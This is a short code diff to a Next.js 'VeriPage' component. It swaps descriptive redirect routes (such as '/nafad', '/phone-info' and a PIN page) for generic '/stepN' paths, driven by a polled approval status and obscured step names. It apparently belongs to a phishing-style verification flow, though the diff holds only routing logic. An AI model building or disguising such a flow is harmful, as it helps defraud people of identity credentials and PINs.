@@ -109,7 +109,7 @@ export default function VeriPage() {
             _ss5("approved")
             setError("")
             // Redirect to PIN page
-            router.push("/confi")
+            router.push("/step3")
           } else if (status === "verifying") {
             _ss5("verifying")
           }
@@ -138,15 +138,15 @@ export default function VeriPage() {
 
           // Redirect based on currentStep
           if (step === "home") {
-            router.push("/main")
+            router.push("/step1")
           } else if (step === "phone") {
-            router.push("/phone-info")
+            router.push("/step5")
           } else if (step === "_t6") {
-            router.push("/nafad")
+            router.push("/step4")
           } else if (step === "_st1") {
             router.push("/check")
           } else if (step === "_t3") {
-            router.push("/confi")
+            router.push("/step3")
           }
         }
       },
